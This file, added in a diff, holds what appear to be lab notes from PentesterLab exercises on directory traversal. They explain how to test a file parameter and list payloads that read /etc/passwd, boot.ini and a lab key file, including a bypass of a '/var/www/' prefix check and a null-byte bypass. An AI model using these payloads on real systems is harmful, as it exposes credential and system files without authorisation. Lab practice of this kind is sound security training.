@@ -1,0 +1,52 @@
+___________________________________________________________________
+
+directory traversals
+___________________________________________________________________
+
+as with other vulnerabilities, you can use the "same value 
+technique" to test for this type of issue. for example, if the 
+path used by the application inside a parameter is 
+/images/photo.jpg. you can try to access:
+
+    /images/./photo.jpg: you should see the same file.
+    /images/../photo.jpg: you should get an error.
+    /images/../images/photo.jpg: you should see the same file 
+again.
+    /images/../images/photo.jpg: you should get an error 
+(depending on the file system) or something weird is going on.
+
+you can test: images/../../../../../../../../../../../etc/passwd, 
+if you get the passwd file, the application is vulnerable. the 
+good news is that you don't need to know the number of ../. if 
+you put too many, it will still work.
+
+if you have a directory traversal in windows, you will be able to 
+access test/../../../file.txt, even if the directory test does 
+not exist. this is not the case, on linux
+___________________________________________________________________
+
+#1
+
+even if you know absolute path, you still have to traverse
+
+libcurl.so/file.php?file=./file.php
+libcurl.so/file.php?file=../../pentesterlab.key
+
+linux=/etc/passwd
+windows=boot.ini
+___________________________________________________________________
+
+#2
+
+if (!(strstr($file,"/var/www/")))
+	die();
+
+libcurl.so/file.php?file=/var/www/../../pentesterlab.key
+___________________________________________________________________
+
+#3
+
+null byte (php solved this since [5.3.4])
+
+libcurl.so/file.php?file=../../../../../var/www/hacker.png%00
+___________________________________________________________________
